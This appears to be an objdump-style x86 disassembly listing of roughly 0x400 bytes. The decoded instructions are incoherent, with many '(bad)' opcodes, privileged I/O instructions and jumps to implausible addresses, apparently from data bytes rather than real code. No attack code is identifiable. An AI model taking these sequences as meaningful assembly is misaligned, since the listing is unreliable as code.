  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	shl    ch,1
  416d82:	fisttp DWORD PTR [eax+ebx*2+0x40000f1]
  416d89:	add    DWORD PTR [eax],eax
  416d8b:	add    BYTE PTR [edi-0x6c3691bf],al
  416d91:	push   0x1cd5f5a5
  416d96:	imul   esp,DWORD PTR [edi],0x5bd57210
  416d9c:	(bad)  
  416d9d:	std    
  416d9e:	jne    0x416e08
  416da0:	nop
  416da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416da2:	dec    edx
  416da3:	(bad)  
  416da5:	sbb    BYTE PTR [ebp+0x12840dd0],0xa9
  416dac:	clts   
  416dae:	fadd   st(5),st
  416db0:	mov    ah,0xb6
  416db2:	xchg   ecx,eax
  416db3:	mov    eax,ds:0xc6f24950
  416db8:	cwde   
  416db9:	sbb    BYTE PTR [edi],bl
  416dbb:	popa   
  416dbc:	fsubr  DWORD PTR [edi]
  416dbe:	add    BYTE PTR [esi-0x64],ch
  416dc1:	lds    ecx,FWORD PTR [edi+0x1e]
  416dc4:	retf   
  416dc5:	fild   WORD PTR [edx+0x55]
  416dc8:	into   
  416dc9:	pop    esi
  416dca:	adc    bl,bl
  416dcc:	or     ah,BYTE PTR [eax+0x18426a36]
  416dd2:	add    dh,BYTE PTR [eax+0x7f52721e]
  416dd8:	inc    edi
  416dd9:	in     eax,0xa5
  416ddb:	scas   eax,DWORD PTR es:[edi]
  416ddc:	aam    0x3
  416dde:	push   cs
  416ddf:	es cmp al,0x59
  416de2:	push   ss
  416de3:	dec    ecx
  416de4:	or     eax,DWORD PTR [eax+eiz*8]
  416de7:	sbb    eax,0x53f73e2c
  416dec:	dec    esi
  416ded:	sub    eax,DWORD PTR [eax+0x7c]
  416df0:	dec    ebx
  416df1:	dec    esp
  416df2:	test   DWORD PTR [edx-0x5],eax
  416df5:	pushf  
  416df6:	add    eax,0x89336ea8
  416dfb:	std    
  416dfc:	jbe    0x416def
  416dfe:	pop    ss
  416dff:	dec    esp
  416e00:	mov    ecx,0x7a4653de
  416e05:	pop    es
  416e06:	push   ebx
  416e07:	pop    es
  416e08:	cmp    eax,0x251c83f
  416e0d:	cmp    esi,esi
  416e0f:	ror    BYTE PTR [esi+0x626ed63a],cl
  416e15:	mov    ecx,0x20c7c12e
  416e1a:	pop    esi
  416e1b:	rol    DWORD PTR [ebp+edi*2-0x41b024ba],1
  416e22:	ds push ss
  416e24:	pop    edi
  416e25:	jge    0x416e29
  416e27:	mov    edi,0x21f83993
  416e2c:	repnz adc bl,bl
  416e2f:	xchg   esi,eax
  416e30:	inc    esp
  416e31:	pop    ebp
  416e32:	mov    dl,bl
  416e34:	cld    
  416e35:	out    0xa5,al
  416e37:	mov    edx,0x6318d08a
  416e3c:	jns    0x416dce
  416e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e3f:	mov    dh,BYTE PTR [ebx-0x5afc9a83]
  416e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e46:	xor    al,0xab
  416e48:	fadd   QWORD PTR [edx+eax*8+0x75]
  416e4c:	xlat   BYTE PTR ds:[ebx]
  416e4d:	or     eax,0xddb961f
  416e52:	sar    BYTE PTR ds:0xdcdb7ae9,1
  416e58:	repnz aam 0x5f
  416e5b:	pop    edi
  416e5c:	jp     0x416de1
  416e5e:	stos   BYTE PTR es:[edi],al
  416e5f:	add    edx,DWORD PTR [ebp-0x2c]
  416e62:	(bad)  
  416e63:	je     0x416ee4
  416e65:	push   ss
  416e66:	and    ecx,DWORD PTR ds:0x5107c025
  416e6c:	xor    DWORD PTR [ebx+0x1f],edx
  416e6f:	xor    dl,BYTE PTR [ecx+edx*1]
  416e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e73:	es add al,0xfe
  416e76:	into   
  416e77:	mov    esp,0x6ff8162b
  416e7c:	das    
  416e7d:	ins    BYTE PTR es:[edi],dx
  416e7e:	inc    ebx
  416e7f:	idiv   BYTE PTR [esi-0x989770e]
  416e85:	jae    0x416edd
  416e87:	lock pop esp
  416e89:	mov    cl,0xe3
  416e8b:	jp     0x416f03
  416e8d:	mov    bh,0xb6
  416e8f:	and    al,BYTE PTR [eax]
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xa09a8eea
  416f02:	jbe    0x416f0c
  416f04:	pop    esp
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	or     eax,0xec09deec
  416f11:	fisttp WORD PTR [esi]
  416f13:	out    dx,eax
  416f14:	neg    DWORD PTR [ecx]
  416f16:	lods   al,BYTE PTR ds:[esi]
  416f17:	push   0xffffff93
  416f19:	push   ds
  416f1a:	pop    esp
  416f1b:	push   esp
  416f1c:	jl     0x416f9b
  416f1e:	mov    edi,ebp
  416f20:	cwde   
  416f21:	push   ecx
  416f22:	fcmovne st,st(4)
  416f24:	dec    esp
  416f25:	inc    esi
  416f26:	dec    ecx
  416f27:	dec    ebx
  416f28:	fmul   QWORD PTR [ecx-0x38]
  416f2b:	xchg   esi,eax
  416f2c:	push   esp
  416f2d:	lea    edi,[eax+0x7c]
  416f30:	into   
  416f31:	fsub   DWORD PTR [eax]
  416f33:	mov    esi,esi
  416f35:	and    dh,BYTE PTR gs:0xa3cbdac0
  416f3c:	jmp    0x78caff55
  416f41:	(bad)  
  416f42:	jb     0x416f23
  416f44:	imul   ebp,DWORD PTR [ecx+0x24],0xf5299dd1
  416f4b:	sub    ebx,0x2fb531b7
  416f51:	scas   al,BYTE PTR es:[edi]
  416f52:	loop   0x416f4c
  416f54:	mov    dh,0x16
  416f56:	int    0xd3
  416f58:	data16 fist DWORD PTR [esi+0x62]
  416f5c:	cmp    al,0x47
  416f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f60:	push   esp
  416f61:	xchg   BYTE PTR [ecx-0x7e],ch
  416f64:	(bad)  
  416f65:	xor    dl,BYTE PTR [edi]
  416f67:	xchg   ecx,eax
  416f68:	push   cs
  416f69:	in     eax,0xcc
  416f6b:	(bad)  
  416f6c:	scas   eax,DWORD PTR es:[edi]
  416f6d:	add    eax,0xc5598c1f
  416f72:	shr    eax,cl
  416f74:	aaa    
  416f75:	stos   BYTE PTR es:[edi],al
  416f76:	mov    fs,WORD PTR [esi-0x41]
  416f79:	out    0xac,eax
  416f7b:	rcr    BYTE PTR [edi+eiz*4-0x45],0xa8
  416f80:	mov    ecx,0xd9cf3c51
  416f85:	lods   eax,DWORD PTR ds:[esi]
  416f86:	sahf   
  416f87:	add    al,0x9b
  416f89:	xchg   esi,eax
  416f8a:	jo     0x416fdc
  416f8c:	and    BYTE PTR [esi],dl
  416f8e:	cmp    bh,ah
  416f90:	cdq    
  416f91:	aaa    
  416f92:	bnd jo 0x416f48
  416f95:	test   eax,0x364da875
  416f9a:	mov    ds:0xefb90461,al
  416f9f:	ds mov esp,0xaa65a38
  416fa5:	push   esp
  416fa6:	add    BYTE PTR [edx+0x7bf85e9f],dl
  416fac:	jl     0x416f70
  416fae:	stos   BYTE PTR es:[edi],al
  416faf:	adc    ah,BYTE PTR [ecx+eax*1-0xd3f99e5]
  416fb6:	sub    bl,BYTE PTR [esi+0x18]
  416fb9:	rcl    BYTE PTR [edi+0x5e5bcffc],0xa8
  416fc0:	test   al,0xa0
  416fc2:	add    bh,bl
  416fc4:	fs stc 
  416fc6:	mov    ds:0xf5e93d28,eax
  416fcb:	push   es
  416fcc:	pop    edx
  416fcd:	ret    0x56ff
  416fd0:	mov    dl,0x13
  416fd2:	adc    ecx,ebx
  416fd4:	in     al,dx
  416fd5:	mov    DWORD PTR [ecx],ebp
  416fd7:	inc    ebp
  416fd8:	or     al,0x1
  416fda:	test   DWORD PTR [ebp+edi*4-0x3d7f9668],edi
  416fe1:	lock js 0x416f67
  416fe4:	sub    esi,DWORD PTR [eax-0x12]
  416fe7:	dec    edx
  416fe8:	mov    dl,0xeb
  416fea:	or     al,ch
  416fec:	sbb    dl,BYTE PTR [ecx-0x5c4e13d7]
  416ff2:	xchg   esp,eax
  416ff3:	inc    ebp
  416ff4:	jle    0x417015
  416ff6:	inc    ebp
  416ff7:	clc    
  416ff8:	push   eax
  416ff9:	stos   BYTE PTR es:[edi],al
  416ffa:	hlt    
  416ffb:	enter  0x7e58,0x85
  416fff:	add    al,0x33
  417001:	jmp    DWORD PTR [esi]
  417003:	jle    0x416fca
  417005:	das    
  417006:	sub    BYTE PTR [esi],ah
  417008:	lods   al,BYTE PTR ds:[esi]
  417009:	loope  0x41705c
  41700b:	push   es
  41700c:	jmp    0x107aa5f
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esi,DWORD PTR [ebx+0x60d059fd]
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	jg     0x4170d7
  41708e:	ins    DWORD PTR es:[edi],dx
  41708f:	pop    es
  417090:	jno    0x417037
  417092:	push   edi
  417093:	push   ebp
  417094:	inc    eax
  417095:	aad    0xf6
  417097:	cmp    ebp,DWORD PTR [edi]
  417099:	dec    esi
  41709a:	lock xchg ebx,eax
  41709c:	rcl    DWORD PTR [edx],1
  41709e:	add    DWORD PTR [ecx],ebx
  4170a0:	jbe    0x417064
  4170a2:	lea    ebp,[eax]
  4170a4:	jl     0x41704b
  4170a6:	xor    al,cl
  4170a8:	lods   eax,DWORD PTR ds:[esi]
  4170a9:	adc    al,0xa5
  4170ab:	xlat   BYTE PTR ds:[ebx]
  4170ac:	aam    0xef
  4170ae:	or     BYTE PTR ss:[esi-0x6a],0x4a
  4170b3:	nop
  4170b4:	mov    esp,0xbb215e79
  4170b9:	pop    edi
  4170ba:	pop    ebx
  4170bb:	jae    0x41710d
  4170bd:	cmp    al,0xd6
  4170bf:	clc    
  4170c0:	adc    bh,BYTE PTR cs:[edx+0x2]
  4170c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170c5:	shr    BYTE PTR [eax+0x8],0xaa
  4170c9:	in     eax,0x52
  4170cb:	pusha  
  4170cc:	push   eax
  4170cd:	retf   
  4170ce:	call   0x4e3a3bb8
  4170d3:	fsubr  DWORD PTR [ebx]
  4170d5:	lods   al,BYTE PTR ds:[esi]
  4170d6:	hlt    
  4170d7:	cwde   
  4170d8:	inc    eax
  4170d9:	jno    0x4170c1
  4170db:	lds    eax,FWORD PTR [ebx]
  4170dd:	adc    ecx,DWORD PTR [esi-0x6fb3148a]
  4170e3:	mov    esi,0xf9d465ae
  4170e8:	sbb    cl,al
  4170ea:	or     BYTE PTR [ebp-0x78ec547d],cl
  4170f0:	lods   eax,DWORD PTR ds:[esi]
  4170f1:	cmp    ch,BYTE PTR [ebp-0x72464f6f]
  4170f7:	out    0x8b,eax
  4170f9:	dec    esi
  4170fa:	ja     0x4170f0
  4170fc:	inc    edi
  4170fd:	sub    dl,dl
  4170ff:	xchg   edi,eax
  417100:	jb     0x4170ba
  417102:	call   DWORD PTR [ebx-0x28]
  417105:	jb     0x4170f0
  417107:	mov    es,WORD PTR [ebx+0x25249662]
  41710d:	adc    edx,DWORD PTR [ecx]
  41710f:	out    0xd4,eax
  417111:	xchg   eax,edi
  417113:	inc    edi
  417114:	jl     0x41715f
  417116:	jbe    0x4170d0
  417118:	sahf   
  417119:	(bad)  
  41711b:	mov    edi,0x1893de06
  417120:	inc    ebx
  417121:	lds    eax,FWORD PTR [eax+edi*8-0x52]
  417125:	add    BYTE PTR [ebx+0x1c],ch
  417128:	pop    eax
  417129:	les    esi,FWORD PTR [ebx]
  41712b:	retf   
  41712c:	lods   al,BYTE PTR ds:[esi]
  41712d:	xor    ebx,edi
  41712f:	loope  0x4170bb
  417131:	loope  0x4170ed
  417133:	xchg   edi,eax
  417134:	call   0xf524:0x3d0057a
  41713b:	mov    edx,DWORD PTR [ecx+0x5e]
  41713e:	inc    ebx
  41713f:	jp     0x4170d2
  417141:	dec    edi
  417142:	sbb    al,0x36
  417144:	mov    eax,ds:0x5e7ecfca
  417149:	in     eax,0x4b
  41714b:	ins    BYTE PTR es:[edi],dx
  41714c:	sbb    al,0x97
  41714e:	mov    ds:0x13936005,al
  417153:	(bad)
  417156:	test   BYTE PTR [ebx],bl
  417158:	push   0xbde0ae58
  41715d:	retf   0xf376
  417160:	call   0xc3cc0597
  417165:	shr    edx,cl
  417167:	dec    ebp
  417168:	inc    ebx
  417169:	mov    eax,DWORD PTR [ebx]
  41716b:	cwde   
  41716c:	int    0x49
  41716e:	cmp    cl,BYTE PTR [ebp+0x12e783fb]
  417174:	and    cl,BYTE PTR [edx-0x74853860]
  41717a:	push   edi
  41717b:	xchg   edi,eax
  41717c:	and    al,0x97
  41717e:	xor    dl,BYTE PTR [ecx]
  417180:	jo     0x417130
  417182:	inc    edx
  417183:	neg    BYTE PTR [edx+0x2bdca645]
  417189:	dec    ebp
  41718a:	sti    
  41718b:	es cli 
  41718d:	mov    bl,0xf9
  41718f:	pop    ebx
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	(bad)  
  417201:	push   0xf4643519
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	add    al,0xe2
  41720e:	push   edx
  41720f:	imul   eax,DWORD PTR [edi+ebp*8+0x20],0xffffffed
  417214:	inc    esp
  417215:	xor    al,0x6a
  417217:	mov    edx,0x5ec44feb
  41721c:	jg     0x417201
  41721e:	push   edi
  41721f:	adc    BYTE PTR [edx+0x45b4c3a3],dl
  417225:	push   ss
  417226:	stc    
  417227:	cld    
  417228:	aam    0x78
  41722a:	push   cs
  41722b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41722c:	add    al,ch
  41722e:	inc    edx
  41722f:	fild   QWORD PTR [eax]
  417231:	(bad)  
  417232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417233:	adc    DWORD PTR [eax+esi*8+0x7cfe0be9],0x37
  41723b:	scas   eax,DWORD PTR es:[edi]
  41723c:	sbb    BYTE PTR [esi+0x6de6a3e3],al
  417242:	push   edi
  417243:	dec    edx
  417244:	loope  0x41726e
  417246:	xchg   edx,eax
  417247:	loopne 0x41722a
  417249:	out    dx,eax
  41724a:	push   ds
  41724b:	mov    dl,0xf6
  41724d:	mov    ecx,0x7917e4e2
  417252:	dec    eax
  417253:	xor    ebx,0x57
  417256:	cs in  al,dx
  417258:	mov    DWORD PTR ds:0x889114f4,esi
  41725e:	xor    al,0xb7
  417260:	jbe    0x4172b6
  417262:	cs lock daa 
  417265:	dec    ebp
  417266:	aad    0x8a
  417268:	jo     0x417226
  41726a:	adc    BYTE PTR [esi],dl
  41726c:	mov    edx,0x76a52365
  417271:	inc    ebx
  417272:	push   ebx
  417273:	inc    esi
  417274:	mov    eax,0xbc870571
  417279:	test   ch,0x4f
  41727c:	int3   
  41727d:	jne    0x4172c0
  41727f:	ins    DWORD PTR es:[edi],dx
  417280:	pop    esp
  417281:	mov    esp,0xde9782ce
  417286:	xor    eax,0x7c1e112a
  41728b:	rcr    DWORD PTR [eax],1
  41728d:	ds jbe 0x417245
  417290:	outs   dx,BYTE PTR ds:[esi]
  417291:	shl    DWORD PTR [edx-0x1f],cl
  417294:	pop    es
  417295:	rcl    eax,cl
  417297:	inc    ecx
  417298:	sbb    eax,0xaa0a36d
  41729d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41729e:	mul    dl
  4172a0:	mov    dh,0x32
  4172a2:	push   ecx
  4172a3:	nop
  4172a4:	sbb    BYTE PTR [ecx+0x7b],0xf3
  4172a8:	mov    dl,0x7f
  4172aa:	enter  0x21e6,0x38
  4172ae:	sar    BYTE PTR [edi],0xe3
  4172b1:	test   al,0xbb
  4172b3:	in     al,dx
  4172b4:	into   
  4172b5:	xchg   ebp,eax
  4172b6:	out    dx,al
  4172b7:	push   eax
  4172b8:	push   edi
  4172b9:	add    DWORD PTR [esi-0x43c804dd],0x6f
  4172c0:	mov    ds:0x443e3634,al
  4172c5:	add    dh,dh
  4172c7:	xor    DWORD PTR [ecx+0x7bc6a50c],edi
  4172cd:	push   0x16
  4172cf:	dec    edx
  4172d0:	pop    edi
  4172d1:	ss repnz aas 
  4172d4:	(bad)  
  4172d5:	mov    eax,ds:0xad93e3c2
  4172da:	mov    eax,ds:0x2836c192
  4172df:	pop    eax
  4172e0:	cmp    edi,edi
  4172e2:	add    al,0x6a
  4172e4:	mov    edi,0x1734eb3a
  4172e9:	adc    bl,BYTE PTR [edi]
  4172eb:	sub    eax,0xc377c02
  4172f0:	hlt    
  4172f1:	ds mov edx,0x870a4498
  4172f7:	adc    dl,0x8f
  4172fa:	mov    esi,DWORD PTR [ecx+0x32]
  4172fd:	call   0x7904:0x19597da6
  417304:	push   ds
  417305:	cmc    
  417306:	sahf   
  417307:	pop    ds
  417308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417309:	sub    BYTE PTR ds:[edx],ah
  41730c:	mov    ah,0xa9
  41730e:	jp     0x417345
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	sub    BYTE PTR gs:0xf568074b,0x0
  417387:	add    BYTE PTR [ecx+eax*1],al
  41738a:	add    BYTE PTR [eax],al
  41738c:	add    BYTE PTR [edi-0x339a1c99],0xce
  417393:	scas   eax,DWORD PTR es:[edi]
  417394:	cdq    
  417395:	ins    BYTE PTR es:[edi],dx
  417396:	push   0xa85ccc1d
  41739b:	jo     0x4173d2
  41739d:	hlt    
  41739e:	add    esi,DWORD PTR [esi]
  4173a0:	repnz xchg ecx,eax
  4173a2:	mov    cl,0x6e
  4173a4:	popf   
  4173a5:	sbb    BYTE PTR [ecx],0xf6
  4173a8:	push   ss
  4173a9:	pop    edi
  4173aa:	retf   0x8e23
  4173ad:	ret    0xaac8
  4173b0:	pop    es
  4173b1:	gs mov cl,0x6d
  4173b4:	mov    ecx,0x29cd05c2
  4173b9:	mov    al,ds:0x22be3ef0
  4173be:	sbb    edi,DWORD PTR [eax]
  4173c0:	push   ebp
  4173c1:	std    
  4173c2:	push   esp
  4173c3:	lods   eax,DWORD PTR ds:[esi]
  4173c4:	add    ch,dh
  4173c6:	mov    ch,0x7d
  4173c8:	scas   al,BYTE PTR es:[edi]
  4173c9:	in     al,0x75
  4173cb:	(bad)  
  4173ce:	test   ebp,edx
  4173d0:	jbe    0x417426
  4173d2:	mov    eax,0x35e059ac
  4173d7:	jb     0x417399
  4173d9:	jns    0x41740e
  4173db:	sub    eax,0xaffdc2d0
  4173e0:	mov    ds:0xad93bd6a,eax
  4173e5:	mov    ch,0xdf
  4173e7:	jo     0x4173a8
  4173e9:	mov    edx,DWORD PTR [esi]
  4173eb:	loopne 0x41742f
  4173ed:	mov    ebp,0x76e03709
  4173f2:	add    al,BYTE PTR [edi-0x42]
  4173f5:	mov    dl,dl
  4173f7:	xor    al,0xb1
  4173f9:	and    esp,DWORD PTR [ecx]
  4173fb:	pushf  
  4173fc:	mov    ebx,DWORD PTR [ebp-0x770f39a2]
  417402:	fs jbe 0x41746c
  417405:	jnp    0x417442
  417407:	push   esp
  417408:	push   edx
  417409:	mov    ebp,0x38efec57
  41740e:	jp     0x4173ae
  417410:	or     al,0xee
  417412:	jae    0x4173f2
  417414:	add    eax,0xfae43cd7
  417419:	xchg   DWORD PTR [eax+esi*1+0x19],esp
  41741d:	mov    bh,0xdf
  41741f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417420:	imul   ebx,DWORD PTR [esi],0xc
  417423:	jecxz  0x417487
  417425:	lods   eax,DWORD PTR ds:[esi]
  417426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417427:	daa    
  417428:	xor    esi,DWORD PTR [ebx]
  41742a:	or     edi,DWORD PTR [esi+0x65]
  41742d:	das    
  41742e:	mov    al,ds:0x8551a425
  417433:	push   esi
  417434:	mov    al,0x4e
  417436:	mov    cl,0xe3
  417438:	jnp    0x4174a5
  41743a:	xchg   esi,eax
  41743b:	mov    ?,WORD PTR [esi+eiz*1-0x15]
  41743f:	(bad)  
  417441:	ins    DWORD PTR es:[edi],dx
  417442:	xor    eax,0xdb4934ba
  417447:	push   0xaefc7bb1
  41744c:	mov    dh,0xe9
  41744e:	jmp    0x72c02a45
  417453:	push   esp
  417454:	xor    edx,ecx
  417456:	xchg   esi,eax
  417457:	arpl   WORD PTR ds:0x652deb62,bp
  41745d:	(bad)  
  41745e:	xor    BYTE PTR [ebx],bl
  417460:	push   ss
  417461:	adc    BYTE PTR [edx+esi*4],al
  417464:	sub    DWORD PTR ds:0x8c9c88fe,ecx
  41746a:	dec    eax
  41746b:	dec    esi
  41746c:	xchg   esp,eax
  41746d:	outs   dx,DWORD PTR ds:[esi]
  41746e:	xchg   ebp,eax
  41746f:	(bad)  
  417470:	cmp    ah,BYTE PTR [ebx]
  417472:	fcom   QWORD PTR [ebp-0x58]
  417475:	test   DWORD PTR [ebx+0x4f],esp
  417478:	mov    dl,0xde
  41747a:	(bad)  
  41747b:	shl    DWORD PTR [ebp-0x27eab92d],cl
  417481:	mov    ah,0xa0
  417483:	ja     0x417421
  417485:	pop    ebx
  417486:	mov    ebp,0xaa435350
  41748b:	and    al,BYTE PTR [esi-0x3]
  41748e:	inc    eax
  41748f:	jmp    0x0:0x0
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	test   BYTE PTR gs:[ecx-0x16],0x6c
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	xchg   esp,eax
  41750d:	add    DWORD PTR [eax],eax
  41750f:	adc    eax,0xafa772fe
  417514:	fmul   QWORD PTR [eax+0x3f]
  417517:	or     dh,BYTE PTR [edi]
  417519:	inc    edx
  41751a:	or     edi,ecx
  41751c:	in     al,0x70
  41751e:	arpl   WORD PTR [ebp+0x77829d5b],si
  417524:	iret   
  417525:	in     al,dx
  417526:	sti    
  417527:	inc    ebp
  417528:	sar    BYTE PTR [ebx+eax*8-0x7eb7e70f],0x71
  417530:	jecxz  0x41758e
  417532:	idiv   bh
  417534:	inc    ebp
  417535:	pop    edx
  417536:	adc    DWORD PTR [esi-0x54],esp
  417539:	ja     0x417586
  41753b:	fwait
  41753c:	inc    ebp
  41753d:	mov    WORD PTR [ecx],?
  41753f:	push   esp
  417540:	add    eax,0xd9b534db
  417545:	push   ss
  417546:	les    esi,FWORD PTR [eax+0x63a07b52]
  41754c:	arpl   cx,dx
  41754e:	jmp    0x1a11bac6
  417553:	mov    bl,0xe9
  417555:	or     eax,0xfdd5fd21
  41755a:	mov    esp,0x2e691c71
  41755f:	cmp    eax,0xfd86fbf2
  417564:	mov    esi,0x1452dd4b
  417569:	ins    DWORD PTR es:[edi],dx
  41756a:	fnstsw WORD PTR [ebx+0xa]
  41756d:	ins    BYTE PTR es:[edi],dx
  41756e:	mov    al,0xc6
  417570:	pop    edi
  417571:	mov    ebp,0x73c1e893
  417576:	pop    edx
  417577:	mov    ch,0x43
  417579:	retf   0x3769
  41757c:	adc    eax,0x8a130380
  417581:	and    DWORD PTR [ebp+ebx*8+0x2828b817],esi
  417588:	aaa    
  417589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41758a:	stc    
  41758b:	fcmovbe st,st(3)
  41758d:	sub    BYTE PTR [edx-0x22c7c052],al
  417593:	sub    bl,BYTE PTR [esp+eax*1+0x2]
  417597:	adc    eax,0xebcadce8
  41759c:	out    dx,al
  41759d:	cdq    
  41759e:	pop    edx
  41759f:	in     al,0xb
  4175a1:	mov    esp,0xed03dada
  4175a6:	dec    esp
  4175a7:	push   cs
  4175a8:	dec    esp
  4175a9:	mov    ebp,0x43f83c09
  4175ae:	pop    eax
  4175af:	call   0xdaf69e76
  4175b4:	mov    edx,0x191f1c90
  4175b9:	push   esi
  4175ba:	xor    eax,0xeeafafb8
  4175bf:	xchg   edi,eax
  4175c0:	das    
  4175c1:	add    al,0x3f
  4175c3:	rcr    BYTE PTR [ebx-0x4aabb571],cl
  4175c9:	jnp    0x41761e
  4175cb:	les    esi,FWORD PTR [ebp-0x12d6bc89]
  4175d1:	addr16 int 0x59
  4175d4:	(bad)  
  4175d5:	lds    eax,FWORD PTR [eax]
  4175d7:	(bad)  
  4175d8:	(bad)  
  4175d9:	cmp    eax,0x613638fa
  4175de:	std    
  4175df:	mov    ah,0x2f
  4175e1:	(bad)  
  4175e2:	scas   ax,WORD PTR es:[edi]
  4175e4:	enter  0x4ed9,0xcc
  4175e8:	dec    ecx
  4175e9:	mul    DWORD PTR [edx+0x51]
  4175ec:	sub    DWORD PTR [edx+0x5b],0xa
  4175f0:	pop    ecx
  4175f1:	outs   dx,BYTE PTR ds:[esi]
  4175f2:	dec    esi
  4175f3:	mov    cl,0xd2
  4175f5:	jns    0x4175f2
  4175f7:	rcl    DWORD PTR ds:0x1e3bf962,cl
  4175fd:	xchg   dh,bl
  4175ff:	xlat   BYTE PTR ds:[ebx]
  417600:	bnd ja 0x4175e7
  417603:	sub    edi,eax
  417605:	mov    al,0x8e
  417607:	mov    edi,0xc9d0d060
  41760c:	mov    ch,0x13
  41760e:	pop    ds
  41760f:	cli    
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	(bad)  
  417681:	test   al,0xf7
  417683:	pop    es
  417684:	jo     0x41767d
  417686:	add    BYTE PTR [eax],al
  417688:	add    al,0x1
  41768a:	add    BYTE PTR [eax],al
  41768c:	not    DWORD PTR [ecx+0x7886e3d5]
  417692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417693:	jecxz  0x4176eb
  417695:	shl    ecx,1
  417697:	ror    BYTE PTR [ebp+ecx*8-0xb],0xa3
  41769c:	mov    esi,DWORD PTR [ecx+0x7c]
  41769f:	jmp    0x8039:0x8c87983f
  4176a6:	fcomi  st,st(2)
  4176a8:	into   
  4176a9:	adc    esi,DWORD PTR [esi+0x9]
  4176ac:	ret    
  4176ad:	cld    
  4176ae:	mov    ?,WORD PTR [ebx+0x1932b945]
  4176b4:	xchg   edi,eax
  4176b5:	lea    ecx,[eax]
  4176b7:	push   ebx
  4176b8:	xchg   ebx,eax
  4176b9:	sbb    BYTE PTR [ebx],bl
  4176bb:	inc    esp
  4176bc:	fcomp  DWORD PTR [eax]
  4176be:	mov    bl,0x2d
  4176c0:	xchg   esi,eax
  4176c1:	fcomp  DWORD PTR [ecx+esi*4-0x4a]
  4176c5:	icebp  
  4176c6:	mov    esp,0xa0ff7f4c
  4176cb:	push   ds
  4176cc:	push   ss
  4176cd:	sti    
  4176ce:	push   0xc3b1aef9
  4176d3:	fsub   st,st(7)
  4176d5:	mov    ds:0x12040fc6,al
  4176da:	mov    ah,0x9b
  4176dc:	xor    DWORD PTR [edi+eax*4-0x531245c2],edx
  4176e3:	sbb    al,dl
  4176e5:	and    DWORD PTR [esi],esp
  4176e7:	dec    esi
  4176e8:	sub    ch,BYTE PTR [edi]
  4176ea:	add    al,0x38
  4176ec:	and    eax,0xe20dd95b
  4176f1:	ins    BYTE PTR es:[edi],dx
  4176f2:	mov    dh,0x89
  4176f4:	(bad)  
  4176f5:	js     0x417718
  4176f7:	dec    esp
  4176f8:	in     al,0xcb
  4176fa:	push   ds
  4176fb:	mov    esp,ebx
  4176fd:	shl    BYTE PTR [esp+edi*1-0x210268b5],1
  417704:	dec    eax
  417705:	jle    0x4176a9
  417707:	into   
  417708:	ja     0x417769
  41770a:	dec    eax
  41770b:	pop    ebp
  41770c:	adc    esp,DWORD PTR es:0xebf1b85a
  417713:	ja     0x41769c
  417715:	cmc    
  417716:	sub    BYTE PTR [edi],cl
  417718:	xor    eax,0xaf0e647a
  41771d:	and    ecx,eax
  41771f:	sbb    al,0x6
  417721:	jo     0x4176c1
  417723:	pop    ss
  417724:	test   al,0xac
  417726:	inc    esi
  417727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417728:	push   edi
  417729:	int    0x40
  41772b:	fisubr WORD PTR [ecx+edi*2+0x4d]
  41772f:	xor    al,0x2a
  417731:	int3   
  417732:	gs leave 
  417734:	adc    eax,0x86c58b0f
  417739:	rcl    BYTE PTR [ebp+0x7d8ade1d],0x8
  417740:	data16 fmul DWORD PTR [esi]
  417743:	and    edx,0x36
  417746:	stos   BYTE PTR es:[edi],al
  417747:	in     eax,0xcd
  417749:	inc    ebp
  41774a:	(bad)  [ecx+0x7f]
  41774d:	or     eax,0xc10f05f8
  417752:	pop    esi
  417753:	lock mov edx,0x86945542
  417759:	iret   
  41775a:	mov    ebp,0x7a673330
  41775f:	sub    dl,BYTE PTR [ebx]
  417761:	cmp    DWORD PTR [eax+0x56b0e97a],ebx
  417767:	jnp    0x417737
